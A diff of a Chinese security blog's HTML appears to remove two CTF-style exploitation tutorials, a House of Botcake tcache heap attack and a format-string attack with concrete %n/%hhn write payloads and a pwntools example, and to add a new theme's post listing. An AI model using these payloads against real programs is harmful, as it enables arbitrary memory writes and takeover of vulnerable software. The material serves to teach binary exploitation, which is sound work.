-<h2 id="2-利用方法"><a href="#2-利用方法" class="headerlink" title="2. 利用方法"></a>2. 利用方法</h2><h3 id="2-1-攻击效果"><a href="#2-1-攻击效果" class="headerlink" title="2.1 攻击效果"></a>2.1 攻击效果</h3><p>绕过Tcache的 tcache-dup 检查，将 ‘<em><strong>可控chunk</strong></em>’ 插入’<em><strong>Tcache-list</strong></em>‘,修改‘<em><strong>可控chunk</strong></em>’的<em><strong>fd</strong></em>字段，从而__最终实现__‘<em><strong>任意地址写</strong></em>’。</p>
-<h3 id="2-2-攻击过程"><a href="#2-2-攻击过程" class="headerlink" title="2.2 攻击过程"></a>2.2 攻击过程</h3><p>伪代码表示如下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">size = 0x108</span><br><span class="line"></span><br><span class="line">mem_lst = [ malloc(size) for x in range(7) ] #创建7个chunk</span><br><span class="line"></span><br><span class="line">a = malloc(size) </span><br><span class="line">b = malloc(size)  #a,b chunk是主角</span><br><span class="line"></span><br><span class="line">malloc(0x18) #和top_chunk隔离，防止forward-consolidation</span><br><span class="line"></span><br><span class="line">[free(x) for x in mem_lst] #把7个chunk free到tcache中,tcache被填满</span><br><span class="line"></span><br><span class="line">free(a) #因tcache已满，a、b进unsorted-bin</span><br><span class="line">free(b) #a、b邻接,因此发生consolidate合并成一个chunk在unsorted-bin中</span><br><span class="line"></span><br><span class="line">malloc(size) #一次分配后tcache有一个空位</span><br><span class="line">free(b) #对b使用double-free攻击。由于b不在tcache中，因此通过tcache检查被加入到tcache中。</span><br><span class="line"></span><br><span class="line">c = malloc(size + 0x30) #unsorted-bin发生remaindering，chunk-b的前0x30被memory-c overlap</span><br><span class="line"></span><br><span class="line">payload = size * b&quot;\0&quot; + p64(size) + p64(target_address) </span><br><span class="line">#不同size时的payload写法不同；但目的是target_address覆盖到 b-&gt;fd</span><br><span class="line"></span><br><span class="line">write(c, payload)  ##这里将target_address链接到tcache list中，下次对tcache size的内存请求即可分配到目标地址的内存chunk</span><br><span class="line"></span><br><span class="line">target_memory = malloc(size)</span><br><span class="line">write(target_memory, arbitrary_value)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><p><a target="_blank" rel="noopener" href="https://github.com/StarCross-Tech/heap_exploit_2.31/blob/master/house_of_botcake.c">heap_exploit_2.31&#x2F;house_of_botcake.c</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.4x7.fun/2022/03/18/fmtstr_attack/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="A4x7eq28'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2022/03/18/fmtstr_attack/" itemprop="url">Format-String Attack</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-03-18T11:42:27+08:00">
-                2022-03-18
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Format-String/" itemprop="url" rel="index">
-                    <span itemprop="name">Format String</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="1-漏洞样式"><a href="#1-漏洞样式" class="headerlink" title="1. 漏洞样式"></a>1. 漏洞样式</h2><p>通常情况下漏洞程序样式：  </p>
-<div align=center>Table 1. Vulnerable Code Demo</div>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">char buffer[1024];</span><br><span class="line">gets(buffer, 1024);</span><br><span class="line">printf(buffer);</span><br></pre></td></tr></table></figure>
-
-<p>字符串 <strong>buffer</strong> 可控且作为 <strong>printf</strong> 的第一个参数。当其中包含 <strong>格式化字符(例如%s, %d, %p等)</strong> 时，栈上的内容就会被当做printf的第2个、第3个参数等被输出。</p>
-<h2 id="2-利用方法"><a href="#2-利用方法" class="headerlink" title="2. 利用方法"></a>2. 利用方法</h2><h3 id="2-1-确定偏移"><a href="#2-1-确定偏移" class="headerlink" title="2.1 确定偏移"></a>2.1 确定偏移</h3><p> 输入字符串（即Table 1中<strong>buffer</strong>）在栈上的偏移，即<strong>buffer</strong>被<strong>printf</strong>当做参数时，作为第几个参数。参数序号从0开始： printf(arg0, arg1, arg2, …, argn); 第10参数即表示arg10</p>
-<ul>
-<li>步骤1. <strong>break printf</strong> ；即在 <strong>printf</strong> 下断点  </li>
-<li>步骤2. 输入 <strong>%p%p%p%p</strong> 等特殊字符    </li>
-<li>步骤3. 在  <strong>printf</strong> 函数断点，使用 <strong>stack</strong> 命令查看栈。找到 <strong>%p%p%p%p</strong> 特殊字符串在栈上的位置。如Figure 1所示。<br><img src="https://s2.loli.net/2022/03/18/vqXDrI3Z5m4CHRE.png"><div align=center>Figure 1. printf stack illustration</div>
-需注意图中①断点在**printf**入口，已跳转到**printf** 但尚未执行**printf**中指令（尤其是栈指令，否则栈布局会改变）；注意图中② **0b** 即字符串 **%p%p%p%p** 距离栈顶( **esp** )的偏移为 **11**；由于在 **esp + 0** 的位置存放函数返回地址。因此 **%p%p%p%p** 字符串实际上位于 ***栈上*** 第 **10** 个参数。</li>
-<li>步骤4. 根据不同架构确定 <strong>buffer</strong> 在 <strong>printf</strong> 函数参数的序号。参考<a target="_blank" rel="noopener" href="https://www.laruence.com/2008/04/01/116.html"><strong>函数调用约定</strong></a>。<ul>
-<li>a). x86架构<br>  x86架构的函数参数全部通过栈传递， 因此 <strong>buffer</strong> 是 <strong>printf</strong> 的第<strong>10</strong>个参数。       </li>
-<li>b). x64架构<br>  x64传参顺序为rdi, rsi, rdx, rcx, r8, r9; 之后才使用栈传参。因此若 <strong>Figure 1</strong> 在x64架构中，<strong>buffer</strong>对应的是<strong>printf</strong>函数的第（0xb + 6 - 1)&#x3D; 16 个参数(参数序号从0开始，0，1，2，…, 16)。</li>
-</ul>
-</li>
-</ul>
-<h3 id="2-2-实现任意地址写"><a href="#2-2-实现任意地址写" class="headerlink" title="2.2 实现任意地址写"></a>2.2 实现任意地址写</h3><p>往 <strong>任意目标地址(记为target_address)</strong> 中写入 <strong>任意值(记为target_value)</strong> 。     </p>
-<ul>
-<li>1). 任意值的控制：通过格式化字符串 <strong>%Mc</strong> 其中 <strong>M&#x3D;target_value</strong>来操控</li>
-<li>2). 任意地址的控制：将目标地址(<strong>target_address</strong>)写入<strong>buffer</strong>字符串中；并通过格式化字符串 <strong>%N$n</strong>来指定将 <em><strong>当前printf已经输字符个数</strong></em> 写入到第 <strong>N</strong> 个参数指定的地址中。其中 <strong>N</strong>即为’使用<strong>2.1</strong>中方法确定的‘’在<strong>buffer</strong>字符串中的‘’<strong>target_address</strong>在栈上的位置对应的<strong>printf</strong>的参数序号‘。(该处使用’’分句停顿帮助阅读)</li>
-</ul>
-<p>例如： </p>
-<h4 id="2-2-1-当target-value-较小时，直接写入"><a href="#2-2-1-当target-value-较小时，直接写入" class="headerlink" title="2.2.1 当target_value 较小时，直接写入"></a>2.2.1 当<strong>target_value</strong> 较小时，直接写入</h4><p>假如buffer字符串位于printf第10个参数的位置(即arg10、即printf栈0xb(10+1)参数位）</p>
-<div align=center>Table 2. Payload Demo 1</div>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 写4到target_address</span><br><span class="line">payload1 = p32(target_address) + b&#x27;%10$n\0&#x27;</span><br></pre></td></tr></table></figure>
-
-
-<p>其中：<br>payload1实现写4(p32为4byte)到target_address</p>
-<div align=center>Table 3. Payload Demo 2</div>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload2 = b&#x27;%13$n&#x27; + b&#x27;%100c&#x27; </span><br><span class="line">payload2 = payload2.ljust(12, b&#x27;a&#x27;)</span><br><span class="line">payload2 += p32(target_address)</span><br></pre></td></tr></table></figure>
-
-<p>payload2实现写100到target_address, 此处由于target_adress没有写在字符串的开头，因此需要重新计算在栈上的偏移：字符串开头位于arg10处，字符串中target_address之前有12个字符即占3个参数位，因此target_address对应的参数位为13</p>
-<h4 id="2-2-2-当target-value太大时，分字节写入"><a href="#2-2-2-当target-value太大时，分字节写入" class="headerlink" title="2.2.2 当target_value太大时，分字节写入"></a>2.2.2 当target_value太大时，分字节写入</h4><p>假如buffer字符串位于printf第10个参数的位置(即arg10、即printf栈0xb(10+1)参数位）；且需要向<strong>target_address</strong> 中写入的<strong>target_value</strong>为<em><strong>0xbaedbeef</strong></em>。  </p>
-<pre><code>实际上就是令：
-*(int8*)target_address = 0xef = 239
-*(int8*)(target_address + 1) = 0xbe = 190
-*(int8*)(target_address + 2) = 0xed = 237
-*(int8*)(target_address + 3) = 0xba = 186
-</code></pre>
-<p>这种情况下使用 <strong>%N$hhn</strong> 向目标地址写入<strong>int8</strong>宽度值 和 使用 <strong>%N$hn</strong> 向目标地址写入<strong>int16</strong>宽度值，将会非常有用。</p>
-<p>那么可以使用如下payload实现：    </p>
-<div align=center>Table 4. Payload Demo 3</div>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">payload = p32(target_address)          //arg10</span><br><span class="line">payload += p32(target_address + 1)     //arg11</span><br><span class="line">payload += p32(target_address + 2)     //arg12</span><br><span class="line">payload += p32(target_address + 3)     //arg13</span><br><span class="line">//已有16byte输出；写入时从小到大写；即186-&gt;190-&gt;237-&gt;239</span><br><span class="line">// 186 - 16 = 170</span><br><span class="line">payload += b&quot;%170c%13$hhn&quot;</span><br><span class="line">// 190 - 186 = 4</span><br><span class="line">payload += b&quot;%4c%11$hhn&quot;</span><br><span class="line">// 237 - 190 = 47</span><br><span class="line">payload += b&quot;%47c%12$hhn&quot;</span><br><span class="line">// 239 - 237 = 2</span><br><span class="line">payload += b&quot;%2c%10$hhn&quot;</span><br></pre></td></tr></table></figure>
-
-<h4 id="2-2-3-使用pwnlib的fmtstr-payload函数自动构造payload"><a href="#2-2-3-使用pwnlib的fmtstr-payload函数自动构造payload" class="headerlink" title="2.2.3 使用pwnlib的fmtstr_payload函数自动构造payload"></a>2.2.3 使用<strong>pwnlib</strong>的<strong>fmtstr_payload</strong>函数自动构造payload</h4><p>示例如下：</p>
-<div align=center>Table 5. Payload Demo 4: fmtstr_payload</div>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from pwnlib.util import misc</span><br><span class="line">//payload = fmtstr_payload(10, &#123;0x804c044: 0x1&#125;)</span><br><span class="line">payload = fmtstr_payload(10, &#123;target_address: target_value&#125;)</span><br><span class="line">io.send(payload)</span><br></pre></td></tr></table></figure>
-
-<h2 id="2-注意事项"><a href="#2-注意事项" class="headerlink" title="2. 注意事项"></a>2. 注意事项</h2><h2 id="3-原理说明"><a href="#3-原理说明" class="headerlink" title="3. 原理说明"></a>3. 原理说明</h2><p>参考：<br><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">fmtstr_attack on ctf-wiki</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.4x7.fun/404.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="A4x7eq28'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/404.html" itemprop="url">404</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-02-23T19:48:56+08:00">
-                2022-02-23
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<div align=center align=mid style="font-size:4em">Page Not Found</div>
-
-<hr>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-  </section>
-
-  
-
-
-          </div>
-          
-
-
-          
-
-        </div>
-        
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+  <div class="widget">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget-body">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Format-String/">Format String</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/HeapAttack/">HeapAttack</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/HeapAttack-tcache/">HeapAttack, tcache</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/shellcode/">shellcode</a><span class="category-list-count">1</span></li></ul>
     </div>
   </div>
 
-  <aside id="sidebar" class="sidebar">
+
     
-    <div class="sidebar-inner">
-
       
-
-      
-
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-            
-              <p class="site-author-name" itemprop="name"></p>
-              <p class="site-description motion-element" itemprop="description"></p>
-          </div>
-
-          <nav class="site-state motion-element">
-
-            
-              <div class="site-state-item site-state-posts">
-              
-                <a href="/archives/%7C%7C%20archive">
-              
-                  <span class="site-state-item-count">5</span>
-                  <span class="site-state-item-name">posts</span>
-                </a>
-              </div>
-            
-
-            
-              
-              
-              <div class="site-state-item site-state-categories">
-                <a href="/categories/index.html">
-                  <span class="site-state-item-count">4</span>
-                  <span class="site-state-item-name">categories</span>
-                </a>
-              </div>
-            
-
-            
-              
-              
-              <div class="site-state-item site-state-tags">
-                <a href="/tags/index.html">
-                  <span class="site-state-item-count">5</span>
-                  <span class="site-state-item-name">tags</span>
-                </a>
-              </div>
-            
-
-          </nav>
-
-          
-
-          
-
-          
-          
-
-          
-          
-
-          
-
-        </div>
-      </section>
-
-      
-
-      
-
+  <div class="widget">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget-body">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/404/" rel="tag">404</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Format-String/" rel="tag">Format String</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HeapAttack-House-of-Botcake-tcache/" rel="tag">HeapAttack, House_of_Botcake, tcache</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HeapAttack-LargeBinAttack-Arbitrary-Write-Write-After-Free-waf/" rel="tag">HeapAttack, LargeBinAttack, Arbitrary Write, Write After Free, waf</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shellcode/" rel="tag">shellcode</a><span class="tag-list-count">1</span></li></ul>
     </div>
-  </aside>
+  </div>
 
 
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget-body tagcloud">
+      <a href="/tags/404/" style="font-size: 13px;">404</a> <a href="/tags/Format-String/" style="font-size: 13px;">Format String</a> <a href="/tags/HeapAttack-House-of-Botcake-tcache/" style="font-size: 13px;">HeapAttack, House_of_Botcake, tcache</a> <a href="/tags/HeapAttack-LargeBinAttack-Arbitrary-Write-Write-After-Free-waf/" style="font-size: 13px;">HeapAttack, LargeBinAttack, Arbitrary Write, Write After Free, waf</a> <a href="/tags/shellcode/" style="font-size: 13px;">shellcode</a>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Archive</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">February 2022</a><span class="archive-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
         
-      </div>
-    </main>
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/HeapAttack/">HeapAttack</a>
+              </p>
+              <p class="item-title">
+                <a href="/2022/03/23/HeapAttack-LargeBinAttack/" class="title">HeapAttack:LargeBinAttack</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2022-03-23T13:16:30.000Z" itemprop="datePublished">2022-03-23</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/shellcode/">shellcode</a>
+              </p>
+              <p class="item-title">
+                <a href="/2022/03/21/shellcode/" class="title">Shellcode Collection</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2022-03-21T12:44:19.000Z" itemprop="datePublished">2022-03-21</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/HeapAttack-tcache/">HeapAttack, tcache</a>
+              </p>
+              <p class="item-title">
+                <a href="/2022/03/18/HeapAttack-House-of-Botcake/" class="title">HeapAttack:House_of_Botcake</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2022-03-18T12:16:10.000Z" itemprop="datePublished">2022-03-18</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/Format-String/">Format String</a>
+              </p>
+              <p class="item-title">
+                <a href="/2022/03/18/fmtstr_attack/" class="title">Format-String Attack</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2022-03-18T03:42:27.000Z" itemprop="datePublished">2022-03-18</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/404.html" class="title">404</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2022-02-23T11:48:56.000Z" itemprop="datePublished">2022-02-23</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
 
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
-  <span class="with-love">
-    <i class="fa fa-user"></i>
+    
+  </div>
+</aside>
+
+  
+  <main class="main" role="main">
+  
+  <div class="content article-list">
+    
+      <article class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="article-header">
+    
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/03/23/HeapAttack-LargeBinAttack/">HeapAttack:LargeBinAttack</a>
+    </h1>
+  
+
+  </div>
+  
+  <p class="article-meta">
+    <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2022/03/23/HeapAttack-LargeBinAttack/" class="article-date">
+	  <time datetime="2022-03-23T13:16:30.000Z" itemprop="datePublished">Mar 23</time>
+	</a>
+</span>
+    
+  <span class="article-category">
+    <i class="icon icon-folder"></i>
+    <a class="article-category-link" href="/categories/HeapAttack/">HeapAttack</a>
   </span>
-  <span class="author" itemprop="copyrightHolder">A4x7eq28</span>
 
+    
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link-link" href="/tags/HeapAttack-LargeBinAttack-Arbitrary-Write-Write-After-Free-waf/" rel="tag">HeapAttack, LargeBinAttack, Arbitrary Write, Write After Free, waf</a>
+  </span>
+
+
+    <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2022/03/23/HeapAttack-LargeBinAttack/#comments" class="article-comment-link">Comments</a></span>
+    
+  </p>
+</article>
+
+    
+      <article class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="article-header">
+    
   
-</div>
-
-
-  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
-
-
-
-  <span class="post-meta-divider">|</span>
-
-
-
-  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
-
-
-
-
-        
-
-
-
-
-
-
-
-        
-      </div>
-    </footer>
-
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
-      </div>
-    
-
-    
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/03/21/shellcode/">Shellcode Collection</a>
+    </h1>
+  
 
   </div>
+  
+  <p class="article-meta">
+    <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2022/03/21/shellcode/" class="article-date">
+	  <time datetime="2022-03-21T12:44:19.000Z" itemprop="datePublished">Mar 21</time>
+	</a>
+</span>
+    
+  <span class="article-category">
+    <i class="icon icon-folder"></i>
+    <a class="article-category-link" href="/categories/shellcode/">shellcode</a>
+  </span>
 
+    
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link-link" href="/tags/shellcode/" rel="tag">shellcode</a>
+  </span>
+
+
+    <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2022/03/21/shellcode/#comments" class="article-comment-link">Comments</a></span>
+    
+  </p>
+</article>
+
+    
+      <article class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="article-header">
+    
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/03/18/HeapAttack-House-of-Botcake/">HeapAttack:House_of_Botcake</a>
+    </h1>
   
 
-<script type="text/javascript">
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
-  }
+  </div>
+  
+  <p class="article-meta">
+    <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2022/03/18/HeapAttack-House-of-Botcake/" class="article-date">
+	  <time datetime="2022-03-18T12:16:10.000Z" itemprop="datePublished">Mar 18</time>
+	</a>
+</span>
+    
+  <span class="article-category">
+    <i class="icon icon-folder"></i>
+    <a class="article-category-link" href="/categories/HeapAttack-tcache/">HeapAttack, tcache</a>
+  </span>
+
+    
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link-link" href="/tags/HeapAttack-House-of-Botcake-tcache/" rel="tag">HeapAttack, House_of_Botcake, tcache</a>
+  </span>
+
+
+    <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2022/03/18/HeapAttack-House-of-Botcake/#comments" class="article-comment-link">Comments</a></span>
+    
+  </p>
+</article>
+
+    
+      <article class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="article-header">
+    
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/03/18/fmtstr_attack/">Format-String Attack</a>
+    </h1>
+  
+
+  </div>
+  
+  <p class="article-meta">
+    <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2022/03/18/fmtstr_attack/" class="article-date">
+	  <time datetime="2022-03-18T03:42:27.000Z" itemprop="datePublished">Mar 18</time>
+	</a>
+</span>
+    
+  <span class="article-category">
+    <i class="icon icon-folder"></i>
+    <a class="article-category-link" href="/categories/Format-String/">Format String</a>
+  </span>
+
+    
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link-link" href="/tags/Format-String/" rel="tag">Format String</a>
+  </span>
+
+
+    <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2022/03/18/fmtstr_attack/#comments" class="article-comment-link">Comments</a></span>
+    
+  </p>
+</article>
+
+    
+      <article class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="article-header">
+    
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/404.html">404</a>
+    </h1>
+  
+
+  </div>
+  
+  <p class="article-meta">
+    <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/404.html" class="article-date">
+	  <time datetime="2022-02-23T11:48:56.000Z" itemprop="datePublished">Feb 23</time>
+	</a>
+</span>
+    
+    
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link-link" href="/tags/404/" rel="tag">404</a>
+  </span>
+
+
+    <span class="post-comment"><i class="icon icon-comment"></i> <a href="/404.html#comments" class="article-comment-link">Comments</a></span>
+    
+  </p>
+</article>
+
+    
+  </div>
+
+   
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/cofess" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="http://weibo.com/cofess" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com/iwebued" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="https://www.behance.net/cofess" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        <div class="publishby">
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
 </script>
 
+<script src="/js/plugin.min.js"></script>
 
 
+<script src="/js/application.js"></script>
 
 
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
 
+<script src="/js/insight.js"></script>
 
 
 
-  
 
 
 
+   
 
 
 
